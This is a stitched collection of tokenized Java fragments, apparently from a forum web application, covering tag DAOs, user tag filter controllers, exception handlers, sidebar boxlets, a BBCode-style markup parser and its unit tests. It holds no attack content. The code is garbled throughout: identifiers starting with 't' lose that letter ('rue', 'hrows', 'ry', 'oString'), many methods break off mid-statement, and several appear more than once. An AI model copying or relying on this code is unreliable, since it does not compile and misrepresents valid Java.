public void deleteOneTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTag ( user1Id , ag1Id , rue ) ; userTagDao . deleteTag ( user1Id , ag2Id , rue ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; userTagDao . deleteTag ( user1Id , ag2Id , false ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; } 
public void deleteAllTest ( ) { prepareUserTags ( ) ; userTagDao . deleteTags ( ag2Id ) ; int result ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_IGNORE_BY_USER , user1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 1 , result ) ; result = jdbcTemplate . queryForInt ( QUERY_COUNT_FAVORITE_BY_USER , user2Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 4 , result ) ; } 
public void replaceTagTest ( ) { int result ; prepareUserTags ( ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 2 , result ) ; userTagDao . deleteTags ( ag1Id ) ; userTagDao . replaceTag ( ag2Id , ag1Id ) ; result = jdbcTemplate . queryForInt ( " SELECT count(user_id) FROM user_tags WHERE tag_id=? " , ag1Id ) ; Assert . assertEquals ( " Wrong count of user tags. " , 3 , result ) ; } 
public void recalcTagsCounters ( ) { agService . reCalculateAllCounters ( ) ; } 
public void reCalculateAllCounters ( ) { for ( ITagActionHandler actionHandler : actionHandlers ) { actionHandler . reCalculateAllCounters ( ) ; 
public static EditInfoDto createFromMessage ( TopicTagService opicTagService , Topic message , String ext ) { EditInfoDto current = new EditInfoDto ( ) ; current . setOldmessage ( ext ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagService . oString ( opicTagService . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public void addTag ( int msgId , int agId ) { jdbcTemplate . update ( " INSERT INTO tags VALUES(?,?) " , msgId , agId ) ; } 
public void deleteTag ( int msgId , int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE msgid=? and tagid=? " , msgId , agId ) ; 
public void replaceTag ( int oldTagId , int newTagId ) { jdbcTemplate . update ( " UPDATE tags SET tagid=? WHERE tagid=? AND msgid NOT IN (SELECT msgid FROM tags WHERE tagid=?) " , 
public void deleteTag ( int agId ) { jdbcTemplate . update ( " DELETE FROM tags WHERE tagid=? " , agId ) ; } 
public void reCalculateAllCounters ( ) { jdbcTemplate . update ( " update tags_values set counter = (select count(*) from tags join topics on tags.msgid=topics.id where tags.tagid=tags_values.id and not deleted) " ) ; } 
public void reCalculateAllCounters ( ) { opicTagDao . reCalculateAllCounters ( ) ; } 
private void addToReplaceHandlerList ( ) { agService . getActionHandlers ( ) . add ( actionHandler ) ; } 
public void replaceTag ( int oldTagId , String oldTagName , int newTagId , String newTagName ) { userTagDao . replaceTag ( oldTagId , newTagId ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserBanedException ( user , userDao . getBanInfoClass ( user ) ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; mv . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( currentUser | | mpl . isModeratorSession ( ) ) { mv . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } return mv ; } 
public boolean hasFavoriteTag ( User user , String agName ) { ImmutableList < String > ags = favoritesGet ( user ) ; return ags . contains ( agName ) ; } 
public boolean hasIgnoreTag ( User user , String agName ) { ImmutableList < String > ags = ignoresGet ( user ) ; return ags . contains ( agName ) ; } 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = sendEmailToAdmin ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException , UserNotFoundException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < Integer , User > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { ry { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } } return ignoreMap ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { String r = favoriteTagAdd ( request , agName ) ; if ( r ! = null ) { ModelAndView modelAndView = showList ( request , agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , agName + " : " + r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , String > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { String r = favoriteTagAdd ( request , agName ) ; if ( r ! = null ) { return ImmutableMap . of ( " error " , r ) ; } return ImmutableMap . of ( ) ; } 
public @ResponseBody Map < String , String > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( ) ; } 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } int msgid = resultSet . getInt ( " id " ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; int stat1 = resultSet . getInt ( " stat1 " ) ; int groupId = resultSet . getInt ( " gid " ) ; String groupTitle = resultSet . getString ( " gtitle " ) ; String itle = resultSet . getString ( " itle " ) ; int cid = resultSet . getInt ( " cid " ) ; User lastCommentBy ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } boolean resolved = resultSet . getBoolean ( " resolved " ) ; int section = resultSet . getInt ( " section " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; Timestamp postdate = resultSet . getTimestamp ( " postdate " ) ; boolean uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; int pages = Topic . getPageCount ( stat1 , messagesInPage ) ; ImmutableList < String > ags ; if ( msgid ! = 0 ) { ags = opicTagService . getMessageTagsForTitle ( msgid ) ; } else { ags = ImmutableList . of ( ) ; } return new TrackerItem ( author , msgid , lastmod , stat1 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public String racker ( ) { return " redirect:tracker " ; } 
public View rackerOldUrl ( @RequestParam ( value = " filter " , defaultValue = " all " ) String filterAction ) hrows UnsupportedEncodingException { RedirectView redirectView = new RedirectView ( " /tracker/ " ) ; redirectView . setExposeModelAttributes ( false ) ; if ( filterValues . contains ( filterAction ) & & ! filterAction . equals ( " all " ) ) { redirectView . setUrl ( " /tracker/?filter= " + URLEncoder . encode ( filterAction , " UTF-8 " ) ) ; } return redirectView ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagService . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagService . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { List < String > r = favoriteTagAdd ( request , agName ) ; if ( r . size ( ) ! = 0 ) { ModelAndView modelAndView = showList ( request , agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , String > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { List < String > r = favoriteTagAdd ( request , agName ) ; if ( r . size ( ) ! = 0 ) { return ImmutableMap . of ( " error " , StringUtils . join ( r , " ; " ) ) ; } return ImmutableMap . of ( ) ; } 
private List < String > favoriteTagAdd ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; return userTagService . addMultiplyTags ( user , agName , rue ) ; } 
Map < String , String > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( ) ; } 
public void addMultiplyTagsTest ( ) { UserTagService mockUserTagService = mock ( UserTagService . class ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } List < String > strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , rue ) ; ry { verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . favoriteAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( strErrors . size ( ) , 3 ) ; reset ( mockUserTagService ) ; when ( mockUserTagService . addMultiplyTags ( any ( User . class ) , anyString ( ) , anyBoolean ( ) ) ) . henCallRealMethod ( ) ; when ( mockUserTagService . parseTags ( anyString ( ) , any ( Errors . class ) ) ) . henCallRealMethod ( ) ; ry { doThrow ( new TagNotFoundException ( ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; doThrow ( new DuplicateKeyException ( " duplicate " ) ) . when ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag3 " ) ) ; } catch ( Exception e ) { } strErrors = mockUserTagService . addMultiplyTags ( user , " ag1, tag2, tag3, uytutut, @#$%$# " , false ) ; ry { verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag1 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " ag2 " ) ) ; verify ( mockUserTagService ) . ignoreAdd ( eq ( user ) , eq ( " uytutut " ) ) ; verify ( mockUserTagService , never ( ) ) . ignoreAdd ( eq ( user ) , eq ( " @#$%$# " ) ) ; verify ( mockUserTagService , never ( ) ) . favoriteAdd ( any ( User . class ) , anyString ( ) ) ; } catch ( Exception e ) { } Assert . assertEquals ( strErrors . size ( ) , 3 ) ; } 
public void moveTopic ( Topic msg , Group newGrp , User moveBy ) { String url = msg . getUrl ( ) ; boolean lorcode = msgbaseDao . getMessageText ( msg . getId ( ) ) . isLorcode ( ) ; jdbcTemplate . update ( " UPDATE topics SET groupid=?,lastmod=CURRENT_TIMESTAMP WHERE id=? " , newGrp . getId ( ) , msg . getId ( ) ) ; if ( ! newGrp . isLinksAllowed ( ) & & ! newGrp . isImagePostAllowed ( ) ) { jdbcTemplate . update ( " UPDATE topics SET linktext=null, url=null WHERE id=? " , msg . getId ( ) ) ; 
private PreparedImage prepareImage ( Topic opic , boolean secure ) { String mediumName = Screenshot . getMediumName ( opic . getUrl ( ) ) ; String htmlPath = configuration . getHTMLPathPrefix ( ) ; if ( ! new File ( htmlPath , mediumName ) . exists ( ) ) { mediumName = opic . getLinktext ( ) ; } ry { ImageInfo mediumImageInfo = new ImageInfo ( htmlPath + mediumName ) ; 
private void initializeBoxlet ( ) hrows SectionNotFoundException { sectionNews = sectionService . getSection ( Section . SECTION_NEWS ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { List < ArchiveDTO > list = archiveDao . getArchiveDTO ( sectionNews , 13 ) ; return new ModelAndView ( " boxlets/archive " , " items " , list ) ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ModelAndView mav = new ModelAndView ( ) ; mav . setViewName ( " boxlets/gallery " ) ; List < GalleryItem > list = galleryDao . getGalleryItems ( COUNT_ITEMS ) ; mav . addObject ( " items " , list ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { ProfileProperties profile = Template . getTemplate ( request ) . getProf ( ) ; final int i = profile . getTags ( ) ; List < TagDTO > list = agDao . getTags ( i ) ; ModelAndView mav = new ModelAndView ( " boxlets/tagcloud " , " ags " , list ) ; mav . addObject ( " count " , i ) ; return mav ; } 
protected ModelAndView getData ( HttpServletRequest request ) hrows Exception { final Poll poll = pollDao . getCurrentPoll ( ) ; Topic msg = messageDao . getById ( poll . getTopicId ( ) ) ; int count = pollDao . getVotersCount ( poll . getId ( ) ) ; int countUsers = pollDao . getCountUsers ( poll ) ; ModelAndView result = new ModelAndView ( " boxlets/poll " ) ; result . addObject ( " poll " , poll ) ; result . addObject ( " count " , count ) ; result . addObject ( " message " , msg ) ; result . addObject ( " countUsers " , countUsers ) ; return result ; } 
public ModelAndView defaultExceptionHandler ( HttpServletRequest request , HttpServletResponse response , Object handler ) { Throwable ex = ( Throwable ) request . getAttribute ( " javax.servlet.error.exception " ) ; if ( ex = = null ) { return new ModelAndView ( new RedirectView ( " / " ) ) ; } if ( ! ( ex instanceof Exception ) ) { return exceptionResolver . resolveException ( request , response , handler , new RuntimeException ( ex ) ) ; 
public String parseForOgDescription ( String ext ) { return defaultParser . parseRoot ( prepareCommentRootNode ( false , rue ) , ext ) . renderOg ( ) ; } 
public String renderChildrenBBCode ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderBBCode ( ) ) ; } return stringBuilder . oString ( ) ; } 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( " " ) ; if ( stringBuilder . length ( ) > = 250 ) { break ; } } if ( stringBuilder . length ( ) < = 250 ) { return stringBuilder . oString ( ) . rim ( ) ; 
public String renderOg ( ) { return renderChildrenOg ( ) ; } 
public String renderOg ( ) { return bbtag . renderNodeOg ( his ) ; } 
public String renderOg ( ) { return Parser . escape ( ext ) ; } 
public String renderNodeOg ( Node node ) { return " " ; } 
public String renderNodeOg ( Node node ) { StringBuilder ret = new StringBuilder ( ) ; ret . append ( node . renderChildrenOg ( ) ) ; return ret . oString ( ) ; } 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + " " + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , 
public Poll getPoll ( final int pollId ) hrows PollNotFoundException { int currentPollId = getCurrentPollId ( ) ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { hrow new PollNotFoundException ( ) ; } return new Poll ( pollId , 
public String renderChildrenOg ( ) { StringBuilder stringBuilder = new StringBuilder ( ) ; for ( Node child : children ) { stringBuilder . append ( child . renderOg ( ) ) ; stringBuilder . append ( " " ) ; } return stringBuilder . oString ( ) . rim ( ) ; } 
public String renderOg ( ) { String ret = renderChildrenOg ( ) ; if ( ret . length ( ) < 250 ) { return ret ; 
public void estOg ( ) { assertEquals ( " hello " , lorCodeService . parseForOgDescription ( " hello " ) ) ; assertEquals ( " one crap two three " , lorCodeService . parseForOgDescription ( " [list] " + " [*]one " + " " + " crap " + " [*]two " + " [*]three " + " [/list] " ) ) ; assertEquals ( " due one teo neo wuf? nok " , lorCodeService . parseForOgDescription ( " due n[quote][quote]one[br][/quote]teo[br][quote]neo[br][/quote][/quote]wuf? nok " ) ) ; assertEquals ( " " , lorCodeService . parseForOgDescription ( " [code]&#9618;[/code] " ) ) ; String xt = " many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b]many many [b]texxt [/b] " ; assertEquals ( " many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many texxt many many t... " , lorCodeService . parseForOgDescription ( xt ) ) ; assertEquals ( 250 + 3 , 
public boolean resetPhoto ( User user ) { return jdbcTemplate . update ( " UPDATE users SET photo=null WHERE id=? and photo is not null " , user . getId ( ) ) > 0 ; } 
public ModelAndView handleUserBanedException ( UserBanedException ex ) { return new ModelAndView ( " errors/user-banned " , " exception " , ex ) ; } 
public ModelAndView handleUserNotFoundException ( ) { return new ModelAndView ( " errors/code404 " ) ; } 
public String format ( String ext , boolean quoting ) { if ( quoting ) { return quote ( ext ) ; 
private String escapeCode ( String ext ) { return ext . replaceAll ( " \\ [(/?code(:?=[ \\ w \\ s]+)?) \\ ] " , " [[$1]] " ) ; } 
protected String quote ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = rue ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; } } } if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; } return buf . oString ( ) ; } 
public void codeEscape ( ) { assertEquals ( " [code][/code] " , oLorCodeTexFormatter . format ( " [code][/code] " , rue ) ) ; assertEquals ( " [code=perl][/code] " , oLorCodeTexFormatter . format ( " [code=perl][/code] " , rue ) ) ; assertEquals ( " [[code]][[/code]] " , oLorCodeFormatter . format ( " [code][/code] " , rue ) ) ; assertEquals ( " [[code=perl]][[/code]] " , oLorCodeFormatter . format ( " [code=perl][/code] " , rue ) ) ; 
public void codeAndQuoteTest ( ) { assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " , rue ) ) ; assertEquals ( " [quote] test [br][/quote][code] " + " > test " + " [/code] " , oLorCodeTexFormatter . format ( " > test " + " [code] " + " > test " + " [/code] " , rue ) ) ; assertEquals ( " [quote] test [br] [[code]] [br] test [/quote] " , oLorCodeTexFormatter . format ( " > test " + " > [code] " + " > test " , rue ) ) ; assertEquals ( " [quote] test [[code]] [br] test[br] test [[/code]][/quote] " , oLorCodeTexFormatter . format ( " > test [code] " + " > test " + " > test [/code] " , rue ) ) ; assertEquals ( " [code]test[/code] " + 
public String format ( String ext ) { StringBuilder buf = new StringBuilder ( ) ; String [ ] lines = ext . split ( " ( \\ r? \\ n) " ) ; int globalNestingLevel = 0 ; int currentLine = 0 ; boolean isCode = false ; for ( String line : lines ) { currentLine = currentLine + 1 ; if ( line . isEmpty ( ) ) { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } else { buf . append ( '' ) ; } continue ; } Matcher m = QUOTE_PATTERN . matcher ( line ) ; if ( ! isCode & & m . find ( ) ) { int nestingLevel = m . group ( 1 ) . length ( ) ; if ( globalNestingLevel = = 0 ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel < globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel - nestingLevel ) ) ; globalNestingLevel = nestingLevel ; } else if ( nestingLevel > globalNestingLevel ) { buf . append ( StringUtil . repeat ( " [quote] " , nestingLevel - globalNestingLevel ) ) ; globalNestingLevel = nestingLevel ; } buf . append ( escapeCode ( line . substring ( nestingLevel ) ) ) ; if ( currentLine < lines . length ) { buf . append ( " [br] " ) ; } } else { if ( globalNestingLevel > 0 ) { buf . append ( StringUtil . repeat ( " [/quote] " , globalNestingLevel ) ) ; globalNestingLevel = 0 ; } Matcher codeMatcher = CODE_PATTERN . matcher ( line ) ; if ( codeMatcher . find ( ) ) { isCode = rue ; } Matcher codeEndMatcher = CODE_END_PATTERN . matcher ( line ) ; if ( codeEndMatcher . find ( ) ) { if ( globalNestingLevel > 0 ) { line = escapeCode ( line ) ; } else { isCode = false ; } } buf . append ( line ) ; if ( currentLine < lines . length ) { buf . append ( '' ) ; 